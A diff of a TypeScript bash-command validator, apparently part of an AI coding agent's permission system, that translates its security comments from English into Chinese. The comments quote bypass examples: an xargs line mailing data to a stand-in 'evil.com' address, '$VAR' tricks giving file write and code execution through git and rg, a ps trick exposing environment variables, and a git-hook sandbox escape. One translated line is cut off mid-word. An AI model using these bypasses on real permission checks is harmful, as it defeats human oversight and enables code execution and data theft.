@@ -31,7 +31,7 @@ import {
 } from './pathValidation.js'
 import { sedCommandIsAllowedByAllowlist } from './sedValidation.js'
 
-// Unified command validation configuration system
+// 统一命令验证配置系统
 type CommandConfig = {
   // A Record mapping from the command (e.g. `xargs` or `git diff`) to its safe flags and the values they accept
   safeFlags: Record<string, FlagArgType>
@@ -74,8 +74,8 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--fixed-strings': 'none',
   '-a': 'none',
   '--absolute-path': 'none',
-  // SECURITY: -l/--list-details EXCLUDED — internally executes `ls` as subprocess (same
-  // pathway as --exec-batch). PATH hijacking risk if malicious `ls` is on PATH.
+  // 安全检查: -l/--list-details 排除 — 内部执行 `ls` 作为子进程
+  //（与 --exec-batch 相同的路径）。如果 PATH 中有恶意 `ls`，存在 PATH 劫持风险。
   '-L': 'none',
   '--follow': 'none',
   '-p': 'none',
@@ -122,37 +122,37 @@ const FD_SAFE_FLAGS: Record<string, FlagArgType> = {
   '--format': 'string',
 }
 
-// Central configuration for allowlist-based command validation
-// All commands and flags here should only allow reading files. They should not
-// allow writing to files, executing code, or creating network requests.
+// 允许列表命令验证的中心配置
+// 这里的所有命令和标志应该只允许读取文件。它们不应该
+// 允许写入文件、执行代码或创建网络请求。
 const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
   xargs: {
     safeFlags: {
       '-I': '{}',
-      // SECURITY: `-i` and `-e` (lowercase) REMOVED — both use GNU getopt
-      // optional-attached-arg semantics (`i::`, `e::`). The arg MUST be
-      // attached (`-iX`, `-eX`); space-separated (`-i X`, `-e X`) means the
-      // flag takes NO arg and `X` becomes the next positional (target command).
+      // 安全检查: `-i` 和 `-e`（小写）已删除 — 两者都使用 GNU getopt
+      // 可选附加参数语义（`i::`、`e::`）。参数必须
+      // 附加（`-iX`、`-eX`）；空格分隔（`-i X`、`-e X`）意味着
+      // 标志不带参数，`X` 成为下一个位置（目标命令）。
       //
-      // `-i` (`i::` — optional replace-str):
+      // `-i`（`i::` — 可选 replace-str）:
       //   echo /usr/sbin/sendm | xargs -it tail a@evil.com
-      //   validator: -it bundle (both 'none') OK, tail ∈ SAFE_TARGET → break
-      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → NETWORK EXFIL
+      //   验证器: -it bundle（都是 'none'）OK，tail ∈ SAFE_TARGET → break
+      //   GNU: -i replace-str=t, tail → /usr/sbin/sendmail → 网络泄露
       //
-      // `-e` (`e::` — optional eof-str):
+      // `-e`（`e::` — 可选 eof-str）:
       //   cat data | xargs -e EOF echo foo
-      //   validator: -e consumes 'EOF' as arg (type 'EOF'), echo ∈ SAFE_TARGET
-      //   GNU: -e no attached arg → no eof-str, 'EOF' is the TARGET COMMAND
-      //   → executes binary named EOF from PATH → CODE EXEC (malicious repo)
+      //   验证器: -e 消耗 'EOF' 作为参数（类型 'EOF'），echo ∈ SAFE_TARGET
+      //   GNU: -e 没有附加参数 → 没有 eof-str，'EOF' 是目标命令
+      //   → 从 PATH 执行名为 EOF 的二进制文件 → 代码执行（恶意仓库）
       //
-      // Use uppercase `-I {}` (mandatory arg) and `-E EOF` (POSIX, mandatory
-      // arg) instead — both validator and xargs agree on argument consumption.
-      // `-i`/`-e` are deprecated (GNU: "use -I instead" / "use -E instead").
+      // 使用大写 `-I {}`（强制参数）和 `-E EOF`（POSIX，强制
+      // 参数）代替 — 验证器和 xargs 对参数消耗达成一致。
+      // `-i`/`-e` 已弃用（GNU: "改用 -I" / "改用 -E"）。
       '-n': 'number',
       '-P': 'number',
       '-L': 'number',
       '-s': 'number',
-      '-E': 'EOF', // POSIX, MANDATORY separate arg — validator & xargs agree
+      '-E': 'EOF', // POSIX，强制分隔参数 — 验证器和 xargs 一致
       '-0': 'none',
       '-t': 'none',
       '-r': 'none',
@@ -160,7 +160,7 @@ const COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
       '-d': 'char',
     },
   },
-  // All git read-only commands from shared validation map
+  // 来自共享验证映射的所有 git 只读命令
   ...GIT_READ_ONLY_COMMANDS,
   file: {
     safeFlags: {
@@ -1200,10 +1200,10 @@ const ANT_ONLY_COMMAND_ALLOWLIST: Record<string, CommandConfig> = {
 
 function getCommandAllowlist(): Record<string, CommandConfig> {
   let allowlist: Record<string, CommandConfig> = COMMAND_ALLOWLIST
-  // On Windows, xargs can be used as a data-to-code bridge: if a file contains
-  // a UNC path, `cat file | xargs cat` feeds that path to cat, triggering SMB
-  // resolution. Since the UNC path is in file contents (not the command string),
-  // regex-based detection cannot catch this.
+  // 在 Windows 上，xargs 可以用作数据到代码的桥梁: 如果文件包含
+  // UNC 路径，`cat file | xargs cat` 会将路径提供给 cat，触发 SMB
+  // 解析。由于 UNC 路径在文件内容中（不是命令字符串），
+  // 基于正则表达式的检测无法捕获。
   if (getPlatform() === 'windows') {
     const { xargs: _, ...rest } = allowlist
     allowlist = rest
@@ -1215,19 +1215,19 @@ function getCommandAllowlist(): Record<string, CommandConfig> {
 }
 
 /**
- * Commands that are safe to use as xargs targets for auto-approval.
+ * 可作为 xargs 目标进行自动批准的、安全可用的命令。
  *
- * SECURITY: Only add a command to this list if it has NO flags that can:
- * 1. Write to files (e.g., find's -fprint, sed's -i)
- * 2. Execute code (e.g., find's -exec, awk's system(), perl's -e)
- * 3. Make network requests
+ * 安全检查: 仅当命令没有可执行以下操作的标志时才添加到此列表:
+ * 1. 写入文件（例如 find 的 -fprint，sed 的 -i）
+ * 2. 执行代码（例如 find 的 -exec，awk 的 system()，perl 的 -e）
+ * 3. 发出网络请求
  *
- * These commands must be purely read-only utilities. When xargs uses one of
- * these as a target, we stop validating flags after the target command
- * (see the `break` in isCommandSafeViaFlagParsing), so the command itself
- * must not have ANY dangerous flags, not just a safe subset.
+ * 这些命令必须是纯只读实用程序。当 xargs 使用其中一个
+ * 作为目标时，我们停止在该目标命令之后验证标志
+ *（参见 isCommandSafeViaFlagParsing 中的 `break`），
+ * 因此命令本身不能有任何危险标志，而不只是安全子集。
  *
- * Each command was verified by checking its man page for dangerous capabilities.
+ * 每个命令都通过检查其手册页的危险功能进行了验证。
  */
 const SAFE_TARGET_COMMANDS_FOR_XARGS = [
   'echo', // Output only, no dangerous flags
@@ -1239,14 +1239,14 @@ const SAFE_TARGET_COMMANDS_FOR_XARGS = [
 ]
 
 /**
- * Unified command validation function that replaces individual validator functions.
- * Uses declarative configuration from COMMAND_ALLOWLIST to validate commands and their flags.
- * Handles combined flags, argument validation, and shell quoting bypass detection.
+ * 统一的命令验证函数，替换单个验证器函数。
+ * 使用来自 COMMAND_ALLOWLIST 的声明性配置来验证命令及其标志。
+ * 处理组合标志、参数验证和 shell 引号绕过检测。
  */
 export function isCommandSafeViaFlagParsing(command: string): boolean {
-  // Parse the command to get individual tokens using shell-quote for accuracy
-  // Handle glob operators by converting them to strings, they don't matter from the perspective
-  // of this function
+  // 使用 shell-quote 进行解析以获取准确的单个标记
+  // 通过将 glob 操作符转换为字符串来处理它们，
+  // 从这个函数的角度来看它们无关紧要
   const parseResult = tryParseShellCommand(command, env => `$${env}`)
   if (!parseResult.success) return false
 
@@ -1260,26 +1260,26 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
     return token
   })
 
-  // If there are operators (pipes, redirects, etc.), it's not a simple command.
-  // Breaking commands down into their constituent parts is handled upstream of
-  // this function, so we reject anything with operators here.
+  // 如果有操作符（管道、重定向等），则不是简单命令。
+  // 分解命令的工作在上游处理，
+  // 所以我们在这里拒绝任何带操作符的东西。
   const hasOperators = parsed.some(token => typeof token !== 'string')
   if (hasOperators) {
     return false
   }
 
-  // Now we know all tokens are strings
+  // 现在我们知道所有标记都是字符串
   const tokens = parsed as string[]
 
   if (tokens.length === 0) {
     return false
   }
 
-  // Find matching command configuration
+  // 查找匹配的命令配置
   let commandConfig: CommandConfig | undefined
   let commandTokens: number = 0
 
-  // Check for multi-word commands first (e.g., "git diff", "git stash list")
+  // 首先检查多词命令（如 "git diff"、"git stash list"）
   const allowlist = getCommandAllowlist()
   for (const [cmdPattern] of Object.entries(allowlist)) {
     const cmdTokens = cmdPattern.split(' ')
@@ -1300,24 +1300,24 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
   }
 
   if (!commandConfig) {
-    return false // Command not in allowlist
+    return false // 命令不在允许列表中
   }
 
-  // Special handling for git ls-remote to reject URLs that could lead to data exfiltration
+  // 特殊处理 git ls-remote 以拒绝可能导致数据泄露的 URL
   if (tokens[0] === 'git' && tokens[1] === 'ls-remote') {
-    // Check if any argument looks like a URL or remote specification
+    // 检查任何参数是否看起来像 URL 或远程规范
     for (let i = 2; i < tokens.length; i++) {
       const token = tokens[i]
       if (token && !token.startsWith('-')) {
-        // Reject HTTP/HTTPS URLs
+        // 拒绝 HTTP/HTTPS URL
         if (token.includes('://')) {
           return false
         }
-        // Reject SSH URLs like git@github.com:user/repo.git
+        // 拒绝 SSH URL 如 git@github.com:user/repo.git
         if (token.includes('@') || token.includes(':')) {
           return false
         }
-        // Reject variable references
+        // 拒绝变量引用
         if (token.includes('$')) {
           return false
         }
@@ -1325,44 +1325,45 @@ export function isCommandSafeViaFlagParsing(command: string): boolean {
     }
   }
 
-  // SECURITY: Reject ANY token containing `$` (variable expansion). The
-  // `env => \`$${env}\`` callback at line 825 preserves `$VAR` as LITERAL TEXT
-  // in tokens, but bash expands it at runtime (unset vars → empty string).
-  // This parser differential defeats BOTH validateFlags and callbacks:
+  // 安全检查: 拒绝包含 `$`（变量展开）的任何标记。
+  // 第 825 行的 `env => \`$${env}\`` 回调将 `$VAR` 保留为字面量文本，
+  // 但 bash 在运行时展开它（未设置的变量 → 空字符串）。
+  // 这种解析器差异会击败验证器和回调:
   //
-  //   (1) `$VAR`-prefix defeats validateFlags `startsWith('-')` check:
-  //       `git diff "$Z--output=/tmp/pwned"` → token `$Z--output=/tmp/pwned`
-  //       (starts with `$`) falls through as positional at ~:1730. Bash runs
-  //       `git diff --output=/tmp/pwned`. ARBITRARY FILE WRITE, zero perms.
+  //   (1) `$VAR`-前缀击败 validateFlags `startsWith('-')` 检查:
+  //       `git diff "$Z--output=/tmp/pwned"` → 标记 `$Z--output=/tmp/pwned`
+  //       （以 `$` 开头）作为位置参数落入。Bash 运行
+  //       `git diff --output=/tmp/pwned`。任意文件写入，零权限。
   //
-  //   (2) `$VAR`-prefix → RCE via `rg --pre`:
-  //       `rg . "$Z--pre=bash" FILE` → executes `bash FILE`. rg's config has
-  //       no regex and no callback. SINGLE-STEP ARBITRARY CODE EXECUTION.
+  //   (2) `$VAR`-前缀 → 通过 `rg --pre` 实现 RCE:
+  //       `rg . "$Z--pre=bash" FILE` → 执行 `bash FILE`。rg 的配置
+  //       没有正则表达式和回调。单步任意代码执行。
   //
-  //   (3) `$VAR`-infix defeats additionalCommandIsDangerousCallback regex:
-  //       `ps ax"$Z"e` → token `ax$Ze`. The ps callback regex
-  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` fails on `$` → "not dangerous". Bash runs
-  //       `ps axe` → env vars for all processes. A fix limited to `$`-PREFIXED
-  //       tokens would NOT close this.
+  //   (3) `$VAR`-中缀击败 additionalCommandIsDangerousCallback 正则表达式:
+  //       `ps ax"$Z"e` → 标记 `ax$Ze`。ps 回调正则表达式
+  //       `/^[a-zA-Z]*e[a-zA-Z]*$/` 对 `$` 失败 → "不危险"。Bash 运行
+  //       `ps axe` → 所有进程的环境变量。
+  // 仅覆盖 `$`-前缀 标记的修复不会关闭这个。
   //
-  // We check ALL tokens after the command prefix. Any `$` means we cannot
-  // determine the runtime token value, so we cannot verify read-only safety.
-  // This check must run BEFORE validateFlags and BEFORE callbacks.
+  // 我们检查命令前缀之后的所有标记。
+  // 任何 `$` 意味着我们无法确定运行时的标记值，
+  // 因此无法验证只读安全性。
+  // 此检查必须在 validateFlags 和回调之前运行。
   for (let i = commandTokens; i < tokens.length; i++) {
     const token = tokens[i]
     if (!token) continue
-    // Reject any token containing $ (variable expansion)
+    // 拒绝包含 $（变量展开）的任何标记
     if (token.includes('$')) {
       return false
     }
-    // Reject tokens with BOTH `{` and `,` (brace expansion obfuscation).
-    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote strips quotes
-    // → token `{@{0},--output=/tmp/pwned}` has `{` + `,` → brace expansion.
-    // This is defense-in-depth with validateBraceExpansion in bashSecurity.ts.
-    // We require BOTH `{` and `,` to avoid false positives on legitimate
-    // patterns: `stash@{0}` (git ref, has `{` no `,`), `{{.State}}` (Go
-    // template, no `,`), `prefix-{}-suffix` (xargs, no `,`). Sequence form
-    // `{1..5}` also needs checking (has `{` + `..`).
+    // 拒绝同时包含 `{` 和 `,` 的标记（括号展开混淆）。
+    // `git diff {@'{'0},--output=/tmp/pwned}` → shell-quote 剥离引号
+    // → 标记 `{@{0},--output=/tmp/pwned}` 有 `{` + `,` → 括号展开。
+    // 这是 bashSecurity.ts 中 validateBraceExpansion 的纵深防御。
+    // 我们需要 BOTH `{` 和 `,` 以避免误报:
+    // `stash@{0}`（git ref，有 `{` 无 `,`）、`{{.State}}`（Go
+    // 模板，无 `,`）、`prefix-{}-suffix`（xargs，无 `,`）。
+    // 序列形式 `{1..5}` 也需要检查（有 `{` + `..`）。
     if (token.includes('{') && (token.includes(',') || token.includes('..'))) {
       return false
     }
@@ -1570,32 +1571,31 @@ const READONLY_COMMAND_REGEXES = new Set([
 ])
 
 /**
- * Checks if a command contains glob characters (?, *, [, ]) or expandable `$`
- * variables OUTSIDE the quote contexts where bash would treat them as literal.
- * These could expand to bypass our regex-based security checks.
+ * 检查命令是否包含未引用的 glob 字符（?、*、[、]）或可展开的 `$`
+ * 变量，在 bash 会将它们视为字面量的引号上下文之外。
+ * 这些可能扩展以绕过我们的基于正则表达式的安全检查。
  *
- * Glob examples:
- * - `python *` could expand to `python --help` if a file named `--help` exists
- * - `find ./ -?xec` could expand to `find ./ -exec` if such a file exists
- * Globs are literal inside BOTH single and double quotes.
+ * Glob 示例:
+ * - `python *` 可能扩展为 `python --help`（如果存在名为 `--help` 的文件）
+ * - `find ./ -?xec` 可能扩展为 `find ./ -exec`（如果存在这样的文件）
+ * 在 BOTH 单引号和双引号内，Glob 是字面量。
  *
- * Variable expansion examples:
- * - `uniq --skip-chars=0$_` → `$_` expands to last arg of previous command;
- *   with IFS word splitting, this smuggles positional args past "flags-only"
- *   regexes. `echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → FILE WRITE.
- * - `cd "$HOME"` → double-quoted `$HOME` expands at runtime.
- * Variables are literal ONLY inside single quotes; they expand inside double
- * quotes and unquoted.
+ * 变量展开示例:
+ * - `uniq --skip-chars=0$_` → `$_` 展开为上一条命令的最后一个参数；
+ *   通过 IFS 词分割，这会将位置参数偷偷带入 "仅标志"
+ *   正则表达式。`echo " /etc/passwd /tmp/x"; uniq --skip-chars=0$_` → 文件写入。
+ * - `cd "$HOME"` → 双引号中的 `$HOME` 在运行时展开。
+ * 变量仅在单引号内是字面量；在双引号内和未加引号时会展开。
  *
- * The `$` check guards the READONLY_COMMAND_REGEXES fallback path. The `$`
- * token check in isCommandSafeViaFlagParsing only covers COMMAND_ALLOWLIST
- * commands; hand-written regexes like uniq's `\S+` and cd's `"[^"]*"` allow `$`.
- * Matches `$` followed by `[A-Za-z_@*#?!$0-9-]` covering `$VAR`, `$_`, `$@`,
- * `$*`, `$#`, `$?`, `$!`, `$$`, `$-`, `$0`-`$9`. Does NOT match `${` or `$(` —
- * those are caught by COMMAND_SUBSTITUTION_PATTERNS in bashSecurity.ts.
+ * `$` 检查保护 READONLY_COMMAND_REGEXES 后备路径。
+ * isCommandSafeViaFlagParsing 中的 `$` 标记检查仅覆盖 COMMAND_ALLOWLIST
+ * 命令；手写正则表达式如 uniq 的 `\S+` 和 cd 的 `"[^"]*"` 允许 `$`。
+ * 匹配 `$` 后跟 `[A-Za-z_@*#?!$0-9-]`，覆盖 `$VAR`、`$_`、`$@`、
+ * `$*`、`$#`、`$?`、`$!`、`$$`、`$-`、`$0`-`$9`。不匹配 `${` 或 `$(` —
+ * 那些被 bashSecurity.ts 中的 COMMAND_SUBSTITUTION_PATTERNS 捕获。
  *
- * @param command The command string to check
- * @returns true if the command contains unquoted glob or expandable `$`
+ * @param command 要检查的命令字符串
+ * @returns 如果命令包含未引用的 glob 或可展开的 `$`
  */
 function containsUnquotedExpansion(command: string): boolean {
   // Track quote state to avoid false positives for patterns inside quoted strings
@@ -1788,9 +1788,9 @@ function isGitInternalPath(path: string): boolean {
 const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])
 
 /**
- * Extracts write paths from a subcommand using PATH_EXTRACTORS.
- * Only returns paths for commands that can create new files/directories
- * (write/create operations excluding deletion and in-place modification).
+ * 从子命令中使用 PATH_EXTRACTORS 提取写路径。
+ * 仅返回可以创建新文件/目录的命令的路径
+ *（写/创建操作，不包括删除和就地修改）。
  */
 function extractWritePathsFromSubcommand(subcommand: string): string[] {
   const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
@@ -1823,19 +1823,19 @@ function extractWritePathsFromSubcommand(subcommand: string): string[] {
 }
 
 /**
- * Checks if a compound command writes to any git-internal paths.
- * This is used to detect potential sandbox escape attacks where a command
- * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
+ * 检查复合命令是否写入任何 git 内部路径。
+ * 这用于检测潜在沙箱逃逸攻击，
+ * 其中命令创建 git 内部文件（HEAD、objects/、refs/、hooks/）然后运行 git。
  *
- * SECURITY: A compound command could bypass the bare repo detection by:
- * 1. Creating bare git repo files (HEAD, objects/, refs/, hooks/) in the same command
- * 2. Then running git, which would execute malicious hooks
+ * 安全检查: 复合命令可以通过以下方式绕过裸仓库检测:
+ * 1. 在同一命令中创建裸 git 仓库文件（HEAD、objects/、refs/、hooks/）
+ * 2. 然后运行 git，这会执行创建的恶意钩子
  *
- * Example attack:
+ * 示例攻击:
  * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
  *
- * @param command The full command string to check
- * @returns true if any subcommand writes to git-internal paths
+ * @param command 要检查的完整命令字符串
+ * @returns 如果任何子命令写入 git 内部路径则返回 true
  */
 function commandWritesToGitInternalPaths(command: string): boolean {
   const subcommands = splitCommand_DEPRECATED(command)
@@ -1864,9 +1864,9 @@ function commandWritesToGitInternalPaths(command: string): boolean {
 }
 
 /**
- * Checks read-only constraints for bash commands.
- * This is the single exported function that validates whether a command is read-only.
- * It handles compound commands, sandbox mode, and safety checks.
+ * 检查 bash 命令的只读约束。
+ * 这是验证命令是否为只读的主导出函数。
+ * 它处理复合命令、沙箱模式和安
  *
  * @param input The bash command input to validate
  * @param compoundCommandHasCd Pre-computed flag indicating if any cd command exists in the compound command.
@@ -1879,80 +1879,80 @@ export function checkReadOnlyConstraints(
 ): PermissionResult {
   const { command } = input
 
-  // Detect if the command is not parseable and return early
+  // 检测命令是否不可解析并提前返回
   const result = tryParseShellCommand(command, env => `$${env}`)
   if (!result.success) {
     return {
       behavior: 'passthrough',
-      message: 'Command cannot be parsed, requires further permission checks',
+      message: '命令无法解析，需要进一步权限检查',
     }
   }
 
-  // Check the original command for safety before splitting
-  // This is important because splitCommand_DEPRECATED may transform the command
-  // (e.g., ${VAR} becomes $VAR)
+  // 在拆分之前检查原始命令的安全性
+  // 这很重要，因为 splitCommand_DEPRECATED 可能会转换命令
+  //（例如 ${VAR} 变为 $VAR）
   if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
     return {
       behavior: 'passthrough',
-      message: 'Command is not read-only, requires further permission checks',
+      message: '命令不是只读的，需要进一步权限检查',
     }
   }
 
-  // Check for Windows UNC paths in the original command before transformation
-  // This must be done before splitCommand_DEPRECATED because splitCommand_DEPRECATED may transform backslashes
+  // 在 splitCommand_DEPRECATED 转换之前检查原始命令中的 Windows UNC 路径
+  // 这必须在 splitCommand_DEPRECATED 之前完成，因为 splitCommand_DEPRECATED 可能会转换反斜杠
   if (containsVulnerableUncPath(command)) {
     return {
       behavior: 'ask',
       message:
-        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
+        '命令包含可能容易受到 WebDAV 攻击的 Windows UNC 路径',
     }
   }
 
-  // Check once if any subcommand is a git command (used for multiple security checks below)
+  // 检查一次是否有任何子命令是 git 命令（用于下面的多个安全检查）
   const hasGitCommand = commandHasAnyGit(command)
 
-  // SECURITY: Block compound commands that have both cd AND git
-  // This prevents sandbox escape via: cd /malicious/dir && git status
-  // where the malicious directory contains fake git hooks that execute arbitrary code.
+  // 安全检查: 阻止同时包含 cd 和 git 的复合命令
+  // 这防止通过: cd /malicious/dir && git status 进行沙箱逃逸
+  // 恶意目录包含可以执行任意代码的假 git 钩子。
   if (compoundCommandHasCd && hasGitCommand) {
     return {
       behavior: 'passthrough',
       message:
-        'Compound commands with cd and git require permission checks for enhanced security',
+        '包含 cd 和 git 的复合命令需要增强安全性的权限检查',
     }
   }
 
-  // SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
-  // This prevents sandbox escape when an attacker has:
-  // 1. Deleted .git/HEAD to invalidate the normal git directory
-  // 2. Created hooks/pre-commit or other git-internal files in the current directory
-  // Git would then treat the cwd as the git directory and execute malicious hooks.
+  // 安全检查: 如果当前目录看起来像裸/被利用的 git 仓库，则阻止 git 命令
+  // 这防止当攻击者有以下情况时的沙箱逃逸:
+  // 1. 删除了 .git/HEAD 以使正常的 git 目录无效
+  // 2. 在当前目录中创建了 hooks/pre-commit 或其他 git 内部文件
+  // Git 会将 cwd 视为 git 目录并执行恶意钩子。
   if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
     return {
       behavior: 'passthrough',
       message:
-        'Git commands in directories with bare repository structure require permission checks for enhanced security',
+        '具有裸仓库结构的目录中的 git 命令需要增强安全性的权限检查',
     }
   }
 
-  // SECURITY: Block compound commands that write to git-internal paths AND run git
-  // This prevents sandbox escape where a command creates git-internal files
-  // (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
-  // malicious hooks from the newly created files.
-  // Example attack: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
+  // 安全检查: 阻止写入 git 内部路径并运行 git 的复合命令
+  // 这防止命令创建 git 内部文件
+  //（HEAD、objects/、refs/、hooks/）然后运行 git 的沙箱逃逸，
+  // 这会从新创建的文件执行恶意钩子。
+  // 示例攻击: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
   if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
     return {
       behavior: 'passthrough',
       message:
-        'Compound commands that create git internal files and run git require permission checks for enhanced security',
+        '创建 git 内部文件并运行 git 的复合命令需要增强安全性的权限检查',
     }
   }
 
-  // SECURITY: Only auto-allow git commands as read-only if we're in the original cwd
-  // (which is protected by sandbox denyWrite) or if sandbox is disabled (attack is moot).
-  // Race condition: a sandboxed command can create bare repo files in a subdirectory,
-  // and a backgrounded git command (e.g. sleep 10 && git status) would pass the
-  // isCurrentDirectoryBareGitRepo() check at evaluation time before the files exist.
+  // 安全检查: 仅当我们处于原始 cwd（受沙箱 denyWrite 保护）
+  // 或沙箱被禁用（攻击无意义）时，才自动允许 git 命令为只读。
+  // 竞态条件: 沙箱命令可以在子目录中创建裸仓库文件，
+  // 后台的 git 命令（如 sleep 10 && git status）会在文件存在之前
+  // 的评估时间通过 isCurrentDirectoryBareGitRepo() 检查。
   if (
     hasGitCommand &&
     SandboxManager.isSandboxingEnabled() &&
@@ -1961,11 +1961,11 @@ export function checkReadOnlyConstraints(
     return {
       behavior: 'passthrough',
       message:
-        'Git commands outside the original working directory require permission checks when sandbox is enabled',
+        '当沙箱启用时，原始工作目录之外的 git 命令需要权限检查',
     }
   }
 
-  // Check if all subcommands are read-only
+  // 检查所有子命令是否是只读的
   const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
     subcmd => {
       if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
@@ -1982,7 +1982,7 @@ export function checkReadOnlyConstraints(
     }
   }
 
-  // If not read-only, return passthrough to let other permission checks handle it
+  // 如果不是只读的，返回 passthrough 以让其他权限检查处理它
   return {
     behavior: 'passthrough',
     message: 'Command is not read-only, requires further permission checks',
